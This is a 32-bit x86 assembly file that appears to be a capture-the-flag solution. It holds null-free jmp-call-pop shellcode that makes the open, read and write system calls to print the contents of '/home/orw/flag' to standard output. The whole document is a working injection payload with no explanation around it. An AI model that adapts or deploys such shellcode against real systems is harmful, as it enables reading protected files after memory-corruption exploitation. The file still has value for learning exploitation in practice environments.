BITS 32
jmp short bottom
back:
	pop ebx
	xor eax, eax
	mov al, 5
	xor ecx, ecx
	int 0x80

	mov ecx, ebx
	mov ebx, eax
	xor eax, eax
	mov al, 3
	xor edx, edx
	mov dh, 0x01
	int 0x80
	
	mov edx, eax
	xor eax, eax
	mov al, 4
	xor ebx, ebx
	mov bl, 1
	int 0x80

	xor eax, eax
	mov al, 1
	xor ebx, ebx
	int 0x80
	
bottom:
	call back
	db "/home/orw/flag"
